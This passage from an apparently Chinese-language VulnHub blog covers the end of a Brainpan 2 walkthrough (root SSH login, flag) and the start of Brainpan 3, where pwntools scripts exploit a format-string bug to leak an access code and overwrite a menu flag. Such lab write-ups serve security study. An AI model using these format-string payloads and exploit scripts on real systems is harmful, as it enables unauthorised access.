-la</span><br><span class="line">ls -la</span><br><span class="line">total 32</span><br><span class="line">drwx------ 5 puck  puck   4096 Feb  2 23:23 .</span><br><span class="line">drwxr-xr-x 5 root  root   4096 Nov  4  2013 ..</span><br><span class="line">drwxr-xr-x 3 puck  puck   4096 Nov  5  2013 .backup</span><br><span class="line">-rw------- 1 puck  puck      0 Nov  5  2013 .bash_history</span><br><span class="line">-rw-r--r-- 1 puck  puck    220 Nov  4  2013 .bash_logout</span><br><span class="line">-rw-r--r-- 1 puck  puck   3392 Nov  4  2013 .bashrc</span><br><span class="line">-rw-r--r-- 1 puck  puck    675 Nov  4  2013 .profile</span><br><span class="line">drwx------ 2 puck  anansi 4096 Nov  4  2013 .ssh</span><br><span class="line">drwx------ 2 puck  puck   4096 Nov  5  2013 .ssh-old</span><br><span class="line">puck@brainpan2:/home/puck$ ssh -l <span class="string">&quot;root &quot;</span> brainpan2</span><br><span class="line">ssh -l <span class="string">&quot;root &quot;</span> brainpan2</span><br><span class="line">ssh: connect to host brainpan2 port 22: Connection refused</span><br></pre></td></tr></table></figure>

<p>看看ssh是否没有运行或在其他端口上运行。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan2:/home/puck$ cat /etc/ssh/sshd_config</span><br><span class="line">cat /etc/ssh/sshd_config</span><br><span class="line"><span class="comment"># Package generated configuration file</span></span><br><span class="line"><span class="comment"># See the sshd_config(5) manpage for details</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># What ports, IPs and protocols we listen for</span></span><br><span class="line">Port 2222</span><br><span class="line"><span class="comment"># Use these options to restrict which interfaces/protocols sshd will bind to</span></span><br><span class="line"><span class="comment">#ListenAddress ::</span></span><br><span class="line"><span class="comment">#ListenAddress 0.0.0.0</span></span><br><span class="line">ListenAddress 127.0.1.1</span><br><span class="line">Protocol 2</span><br><span class="line"><span class="comment"># HostKeys for protocol version 2</span></span><br><span class="line">HostKey /etc/ssh/ssh_host_rsa_key</span><br><span class="line">HostKey /etc/ssh/ssh_host_dsa_key</span><br><span class="line">HostKey /etc/ssh/ssh_host_ecdsa_key</span><br><span class="line"><span class="comment">#Privilege Separation is turned on for security</span></span><br><span class="line">UsePrivilegeSeparation yes</span><br><span class="line"></span><br><span class="line"><span class="comment"># Lifetime and size of ephemeral version 1 server key</span></span><br><span class="line">KeyRegenerationInterval 3600</span><br><span class="line">ServerKeyBits 768</span><br><span class="line"></span><br><span class="line"><span class="comment"># Logging</span></span><br><span class="line">SyslogFacility AUTH</span><br><span class="line">LogLevel INFO</span><br><span class="line"></span><br><span class="line"><span class="comment"># Authentication:</span></span><br><span class="line">LoginGraceTime 120</span><br><span class="line">PermitRootLogin yes</span><br><span class="line">StrictModes yes</span><br><span class="line"></span><br><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line"><span class="comment">#AuthorizedKeysFile     %h/.ssh/authorized_keys</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Don&#x27;t read the user&#x27;s ~/.rhosts and ~/.shosts files</span></span><br><span class="line">IgnoreRhosts yes</span><br><span class="line"><span class="comment"># For this to work you will also need host keys in /etc/ssh_known_hosts</span></span><br><span class="line">RhostsRSAAuthentication no</span><br><span class="line"><span class="comment"># similar for protocol version 2</span></span><br><span class="line">HostbasedAuthentication no</span><br><span class="line"><span class="comment"># Uncomment if you don&#x27;t trust ~/.ssh/known_hosts for RhostsRSAAuthentication</span></span><br><span class="line"><span class="comment">#IgnoreUserKnownHosts yes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># To enable empty passwords, change to yes (NOT RECOMMENDED)</span></span><br><span class="line">PermitEmptyPasswords no</span><br><span class="line"></span><br><span class="line"><span class="comment"># Change to yes to enable challenge-response passwords (beware issues with</span></span><br><span class="line"><span class="comment"># some PAM modules and threads)</span></span><br><span class="line">ChallengeResponseAuthentication no</span><br><span class="line"></span><br><span class="line"><span class="comment"># Change to no to disable tunnelled clear text passwords</span></span><br><span class="line"><span class="comment">#PasswordAuthentication yes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Kerberos options</span></span><br><span class="line"><span class="comment">#KerberosAuthentication no</span></span><br><span class="line"><span class="comment">#KerberosGetAFSToken no</span></span><br><span class="line"><span class="comment">#KerberosOrLocalPasswd yes</span></span><br><span class="line"><span class="comment">#KerberosTicketCleanup yes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># GSSAPI options</span></span><br><span class="line"><span class="comment">#GSSAPIAuthentication no</span></span><br><span class="line"><span class="comment">#GSSAPICleanupCredentials yes</span></span><br><span class="line"></span><br><span class="line">X11Forwarding yes</span><br><span class="line">X11DisplayOffset 10</span><br><span class="line">PrintMotd no</span><br><span class="line">PrintLastLog yes</span><br><span class="line">TCPKeepAlive yes</span><br><span class="line"><span class="comment">#UseLogin no</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#MaxStartups 10:30:60</span></span><br><span class="line"><span class="comment">#Banner /etc/issue.net</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Allow client to pass locale environment variables</span></span><br><span class="line">AcceptEnv LANG LC_*</span><br><span class="line"></span><br><span class="line">Subsystem sftp /usr/lib/openssh/sftp-server</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set this to &#x27;yes&#x27; to enable PAM authentication, account processing,</span></span><br><span class="line"><span class="comment"># and session processing. If this is enabled, PAM authentication will</span></span><br><span class="line"><span class="comment"># be allowed through the ChallengeResponseAuthentication and</span></span><br><span class="line"><span class="comment"># PasswordAuthentication.  Depending on your PAM configuration,</span></span><br><span class="line"><span class="comment"># PAM authentication via ChallengeResponseAuthentication may bypass</span></span><br><span class="line"><span class="comment"># the setting of &quot;PermitRootLogin without-password&quot;.</span></span><br><span class="line"><span class="comment"># If you just want the PAM account and session checks to run without</span></span><br><span class="line"><span class="comment"># PAM authentication, then enable this but set PasswordAuthentication</span></span><br><span class="line"><span class="comment"># and ChallengeResponseAuthentication to &#x27;no&#x27;.</span></span><br><span class="line">UsePAM yes</span><br></pre></td></tr></table></figure>

<p>最后终于成功连接ssh并且找到了flag，过程虽然没有太多很难的知识点，但是真够复杂的，不愧被称为brainpan!!!</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan2:/home/puck$ ssh -l <span class="string">&quot;root &quot;</span> brainpan2 -p 2222</span><br><span class="line">ssh -l <span class="string">&quot;root &quot;</span> brainpan2 -p 2222</span><br><span class="line">The authenticity of host <span class="string">&#x27;[brainpan2]:2222 ([127.0.1.1]:2222)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is 0a:15:1c:1c:25:b0:fe:54:8a:35:45:e5:b8:02:97:1a.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)? yes</span></span><br><span class="line"><span class="string">yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>[brainpan2]:2222<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">Linux brainpan2 3.2.0-4-686-pae #1 SMP Debian 3.2.51-1 i686</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Debian GNU/Linux system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span></span><br><span class="line"><span class="string">permitted by applicable law.</span></span><br><span class="line"><span class="string">Last login: Thu Nov  7 11:00:06 2013</span></span><br><span class="line"><span class="string">root @brainpan2:~# id</span></span><br><span class="line"><span class="string">id</span></span><br><span class="line"><span class="string">uid=0(root ) gid=0(root ) groups=0(root )</span></span><br><span class="line"><span class="string">root @brainpan2:~# whoami</span></span><br><span class="line"><span class="string">whoami</span></span><br><span class="line"><span class="string">root </span></span><br><span class="line"><span class="string">root @brainpan2:~# cd /root</span></span><br><span class="line"><span class="string">cd /root</span></span><br><span class="line"><span class="string">root @brainpan2:/root# ls</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">flag.txt  whatif.txt</span></span><br><span class="line"><span class="string">root @brainpan2:/root# cat flag.txt</span></span><br><span class="line"><span class="string">cat flag.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                          !!! CONGRATULATIONS !!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                 You&#x27;</span>ve completed the Brainpan 2 challenge! </span><br><span class="line">                 Or have you...? </span><br><span class="line"></span><br><span class="line">                 Yes, you have! Pat yourself on the back. :-)</span><br><span class="line"></span><br><span class="line">                 Questions, comments, suggestions <span class="keyword">for</span> new VM</span><br><span class="line">                 challenges? Let me know! </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                 Twitter: @superkojiman</span><br><span class="line">                 Email  : contact@techorganic.com</span><br><span class="line">                 Web    : http://www.techorganic.com</span><br><span class="line"></span><br><span class="line">root @brainpan2:/root<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub200.jpg"></p>
<h3 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h3><ul>
<li>popen()执行多个命令获取shell</li>
<li>gdb调试寻找缓冲区溢出的地址</li>
<li>msfvenom生成shellcode配合ebp-8的地址0x0804a008进行缓冲区溢出提权</li>
<li>更换成ssh备份的私匙，连接具有root权限的ssh</li>
<li>.bash_history中的ssh连接历史中ssh密码泄露</li>
</ul>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[brainpan-3]</title>
    <url>/2020/02/03/brainpan-3/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：brainpan：3<br>发行日期：2015年7月27日</p>
<h3 id="难度"><a href="#难度" class="headerlink" title="难度"></a>难度</h3><ul>
<li>万劫不复地狱难度</li>
</ul>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9icmFpbnBhbi9icmFpbnBhbjMuemlw">https://download.vulnhub.com/brainpan/brainpan3.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9icmFpbnBhbi9icmFpbnBhbjMuemlwLnRvcnJlbnQ=">https://download.vulnhub.com/brainpan/brainpan3.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>免责声明<br>使用此虚拟机，即表示您同意，我对任何损失或损害不承担任何责任，包括但不限于间接或间接损失或损害，或由于或来自于此而产生的数据或利润损失而造成的任何损失或损害。与使用此软件的连接。TL; DR：如果发生坏事，这不是我的错。</p>
<p>设定<br>Brainpan 3经过测试，发现可与VMware Player，VMware Fusion和Virtual Box一起使用。<br>检查并确保Brainpan_III.ova具有以下校验和，以便您知道下载的文件是否完整：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">MD5：170e0d8b26ab721587537fcde69087a0SHA1：ed9ae53c556a1ce6988b3a54621dd6469c8b8aa5</span><br></pre></td></tr></table></figure>

<p>将Brainpan_III.ova导入到您首选的管理程序中，并根据需要配置网络设置。它会通过DHCP获得IP地址，但是建议您在NAT内运行它，或者仅对主机OS可见，因为它容易受到攻击。</p>
<p>目标<br>root机器并获取flag。</p>
<ul>
<li>barrebas : <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9iYXJyZWJhcw==">https://twitter.com/barrebas<i class="fa fa-external-link-alt"></i></span></li>
<li>Swappage : <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9Td2FwcGFnZQ==">https://twitter.com/Swappage<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.117</span><br><span class="line">Host is up (0.00020s latency).</span><br><span class="line">MAC Address: 08:00:27:90:21:26 (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># nmap -v -sV -Pn -p- 192.168.56.117 --system-dns</span></span><br><span class="line">PORT     STATE  SERVICE    VERSION</span><br><span class="line">1337/tcp open   waste?</span><br><span class="line">8080/tcp closed http-proxy</span><br></pre></td></tr></table></figure>

<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>找到端口1337后，可以开始使用Brainpan3。可以设置一个小的脚本来轻松地与服务器交互：</p>
<p>bp3.py</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;192.168.56.117&#x27;</span></span><br><span class="line">PORT = 1337</span><br><span class="line"></span><br><span class="line">r = remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>即使文字说</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS</span><br></pre></td></tr></table></figure>

<p>最初的想法是，“太酷了，四位数，Go Go Gadget Brute Force！”。原来，不是在撒谎。经过3次尝试，这个数字确实改变了。</p>
<p>一个登录提示，可以尝试使输入缓冲区溢出，以尝试产生堆栈溢出。这种方法的问题在于，溢出后没有二进制文件可以进行分析。最有意义的漏洞利用是格式字符串。来一些格式字符串试试！</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3/2<span class="comment"># python bp3.py </span></span><br><span class="line">[+] Opening connection to 192.168.56.117 on port 1337: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  __ )    _ \      \    _ _|   \  |   _ \    \      \  |     _ _| _ _| _ _|</span><br><span class="line">  __ \   |   |    _ \     |     \ |  |   |  _ \      \ |       |    |    | </span><br><span class="line">  |   |  __ &lt;    ___ \    |   |\  |  ___/  ___ \   |\  |       |    |    | </span><br><span class="line"> ____/  _| \_\ _/    _\ ___| _| \_| _|   _/    _\ _| \_|     ___| ___| ___|</span><br><span class="line"></span><br><span class="line">                                                            by superkojiman</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AUTHORIZED PERSONNEL ONLY</span><br><span class="line">PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN</span><br><span class="line">A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS</span><br><span class="line"></span><br><span class="line">ACCESS CODE: $ %x.%x.%x.%x.%x.</span><br><span class="line">ERROR <span class="comment">#4: WHAT IS THIS, AMATEUR HOUR?</span></span><br><span class="line"></span><br><span class="line">FAILED LOGIN ATTEMPTS: 1</span><br><span class="line"></span><br><span class="line">AUTHORIZED PERSONNEL ONLY</span><br><span class="line">PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN</span><br><span class="line">A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS</span><br></pre></td></tr></table></figure>

<p>Herm ..是否在％x上进行过滤？尝试其他格式的字符串。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ACCESS CODE: $ %p.%p.%p.%p.</span><br><span class="line">ERROR <span class="comment">#1: INVALID ACCESS CODE: 0xbf8a439c.(nil).0x22dd.0xbf8a439c.</span></span><br><span class="line"></span><br><span class="line">ACCESS CODE MUST BE 4 DIGITS</span><br><span class="line"></span><br><span class="line">FAILED LOGIN ATTEMPTS: 2</span><br><span class="line"></span><br><span class="line">AUTHORIZED PERSONNEL ONLY</span><br><span class="line">PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN</span><br><span class="line">A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS</span><br></pre></td></tr></table></figure>

<p>现在知道此输入容易受到恶意格式字符串的攻击。由于正在寻找一个4位数的访问代码，因此可以假定它可能存储在堆栈中。尝试使用％d。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ACCESS CODE: $ %d.%d.%d.%d.%d.%d.</span><br><span class="line">ERROR <span class="comment">#1: INVALID ACCESS CODE: -1081457764.0.4625.-1081457764.0.10.</span></span><br><span class="line"></span><br><span class="line">ACCESS CODE MUST BE 4 DIGITS</span><br><span class="line"></span><br><span class="line">FAILED LOGIN ATTEMPTS: 3</span><br><span class="line"></span><br><span class="line">BRUTE-FORCE ATTEMPT DETECTED</span><br><span class="line">PLEASE USE THE NEW CODE DISPLAYED ON YOUR ACCESS TOKEN</span><br><span class="line"></span><br><span class="line">AUTHORIZED PERSONNEL ONLY</span><br><span class="line">PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN</span><br><span class="line">A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS</span><br></pre></td></tr></table></figure>

<p>啊!这里的第三个数是什么：4625,尝试一下访问代码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ACCESS CODE: $ 4625</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: ID-7034</span><br><span class="line">  AUTH   [Y]    REPORT [N]    MENU   [Y]  </span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1  - CREATE REPORT</span><br><span class="line">2  - VIEW CODE REPOSITORY</span><br><span class="line">3  - UPDATE SESSION NAME</span><br><span class="line">4  - SHELL</span><br><span class="line">5  - LOG OFF</span><br></pre></td></tr></table></figure>

<p>进来了！在继续进行之前，修改脚本以自动跳过访问代码：</p>
<ul>
<li>发送%d.%d.%d.%d.%d.%d</li>
<li>提取第三个元素（访问代码）</li>
<li>提交访问代码以进行登录</li>
</ul>
<p>从这里开始，将继续向脚本中添加代码片段,结果如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;192.168.56.117&#x27;</span></span><br><span class="line">PORT = 1337</span><br><span class="line"></span><br><span class="line">r = remote(HOST, PORT)</span><br><span class="line">r.sendline(<span class="string">&#x27;%d.&#x27;</span> * 6)</span><br><span class="line">r.recvuntil(<span class="string">&quot;ACCESS CODE: &quot;</span>)</span><br><span class="line">output = r.recv()</span><br><span class="line">code = output.split(<span class="string">&#x27;.&#x27;</span>)[2]</span><br><span class="line">log.info(<span class="string">&quot;Code identified: &#123;&#125;&quot;</span>.format(code))</span><br><span class="line">r.sendline(code)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3/2<span class="comment"># python bp3.py </span></span><br><span class="line">[+] Opening connection to 192.168.56.117 on port 1337: Done</span><br><span class="line">[*] Code identified: 8695</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: ID-4373</span><br><span class="line">  AUTH   [Y]    REPORT [N]    MENU   [Y]  </span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1  - CREATE REPORT</span><br><span class="line">2  - VIEW CODE REPOSITORY</span><br><span class="line">3  - UPDATE SESSION NAME</span><br><span class="line">4  - SHELL</span><br><span class="line">5  - LOG OFF</span><br><span class="line"></span><br><span class="line">ENTER COMMAND: $</span><br></pre></td></tr></table></figure>

<h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h2><p>现在已经登录，可以做更多的探索。看，已经使用Command 4获得了一个Shell：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: $ 4</span><br><span class="line">SELECTED: 4</span><br><span class="line">reynard@brainpan3 $ $ ls</span><br><span class="line">total 0</span><br><span class="line">-rw-rw-r-- 1 reynard reynard 22 May 10 22:26 .flag</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 never</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 gonna</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 give</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 you</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 up</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 never</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 gonna</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 <span class="built_in">let</span></span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 you</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 down</span><br></pre></td></tr></table></figure>

<p>当然，可以尝试溢出此shell脚本/二进制文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">reynard@brainpan3 $ $ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">*** stack smashing detected ***: ./shell terminated</span><br><span class="line">Aborted (core dumped)</span><br></pre></td></tr></table></figure>

<p>经过更多尝试使用典型的recon命令whoami，uname -a等的探索，可以得出结论，该shell是无用的。尝试其他选项：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: $ 1</span><br><span class="line">SELECTED: 1</span><br><span class="line">REPORT MODE IS DISABLED IN THIS BUILD</span><br><span class="line"></span><br><span class="line">SELECTED: 2</span><br><span class="line"></span><br><span class="line">CODE REPOSITORY IS NOW AVAILABLE</span><br></pre></td></tr></table></figure>

<p>看起来report模式当前处于禁用状态。可以尝试打开report，但是要怎么打开？</p>
<p>打开REPOSITORY，在端口8080上启用Web服务，该端口还具有/repo目录，其中包含在此步骤中使用的二进制文件：</p>
<p><img src="http://ctfhacker.com/assets/images/repo-directory.png"></p>
<p>花一些时间了解这些二进制文件是如何工作的，但最终没有任何有用的东西。这里是否存在其他漏洞。</p>
<p>尚未查看的最后一个功能是“Update Session Name”功能：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: $ 3</span><br><span class="line">SELECTED: 3</span><br><span class="line">ENTER NEW SESSION NAME: $ fuckfuckfuckfuck</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: fuckfuckfuckfuck</span><br></pre></td></tr></table></figure>

<p>有趣的是，可以从访问代码中使用会话名称复制字符串格式漏洞吗？</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: $ 3</span><br><span class="line">SELECTED: 3</span><br><span class="line">ENTER NEW SESSION NAME: $ %p.%p.%p.%p.%p.</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: 0xbfcfddcc.0x104.0x252e7025.0x70252e70.0x2e70252e.</span><br></pre></td></tr></table></figure>

<p>可以。丢弃堆栈中的很大一部分，看看有什么。发送70个％x。请注意，仅在末尾添加句点，以便更轻松地拆分结果字符串。这样可以使各个格式字符串与其输出之间的关联更加容易。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: $ 3</span><br><span class="line">SELECTED: 3</span><br><span class="line">ENTER NEW SESSION NAME: $ %x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: bfcfddcc.104.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.ff0a2e78.b76d9c20.bfcfdf1c.0.b76d9000.b76d9ac0.b76da898.b752d940.b759f0b5.b76d9ac0.59.4e.59.b76d98a0.b76d9000.b76d9ac0.</span><br><span class="line">\xff \x9cm\xb7\x1cϿ</span><br></pre></td></tr></table></figure>

<p>在这里，正在研究很多重复的值。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; from pwn import *</span><br><span class="line">&gt;&gt;&gt; unhex(<span class="string">&#x27;252e7825&#x27;</span>)[::-1]</span><br><span class="line"><span class="string">&#x27;%x.%&#x27;</span></span><br></pre></td></tr></table></figure>

<p>看起来那些重复的字符是格式字符串缓冲区。此格式字符串中有一个有趣的段：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># python</span></span><br><span class="line">Python 2.7.17 (default, Jan 19 2020, 19:54:54) </span><br><span class="line">[GCC 9.2.1 20200110] on linux2</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> or <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; from pwn import *</span><br><span class="line">&gt;&gt;&gt; <span class="keyword">for</span> item <span class="keyword">in</span> <span class="string">&#x27;b76d9ac0.59.4e.59.b76d98a0.b76d9000.b76d9ac0.&#x27;</span>.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">...   unhex(item)</span><br><span class="line">... </span><br><span class="line"><span class="string">&#x27;\xb7m\x9a\xc0&#x27;</span></span><br><span class="line"><span class="string">&#x27;Y&#x27;</span></span><br><span class="line"><span class="string">&#x27;N&#x27;</span></span><br><span class="line"><span class="string">&#x27;Y&#x27;</span></span><br><span class="line"><span class="string">&#x27;\xb7m\x98\xa0&#x27;</span></span><br><span class="line"><span class="string">&#x27;\xb7m\x90\x00&#x27;</span></span><br><span class="line"><span class="string">&#x27;\xb7m\x9a\xc0&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>Y，N，Y看起来非常类似于命令菜单中显示的对话框的Y，N，Y。可以尝试在Y，N，Y上写一个缓冲区，使其变为Y，Y，Y吗？抓住4e在格式字符串中的哪个位置，以便知道有多少溢出。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;192.168.56.117&#x27;</span></span><br><span class="line">PORT = 1337</span><br><span class="line"></span><br><span class="line">r = remote(HOST, PORT)</span><br><span class="line">r.sendline(<span class="string">&#x27;%d.&#x27;</span> * 6)</span><br><span class="line">r.recvuntil(<span class="string">&quot;ACCESS CODE: &quot;</span>)</span><br><span class="line">output = r.recv()</span><br><span class="line">code = output.split(<span class="string">&#x27;.&#x27;</span>)[2]</span><br><span class="line">log.info(<span class="string">&quot;Code identified: &#123;&#125;&quot;</span>.format(code))</span><br><span class="line">r.sendline(code)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;%x.&#x27;</span> * 70</span><br><span class="line">r.clean()</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">r.recvuntil(<span class="string">&quot;SESSION: &quot;</span>)</span><br><span class="line">session_name = r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">n_index = session_name.index(<span class="string">&#x27;4e&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&quot;Report &#x27;N&#x27; at offset &#123;&#125;&quot;</span>.format(n_index))</span><br><span class="line">n_index = session_name.index(<span class="string">&#x27;4e&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;Y&#x27;</span> * (4*(n_index-2) + 1) )</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>运行上面的脚本，注意，report现在出现了[Y]！nice！。看看如何处理report。</p>
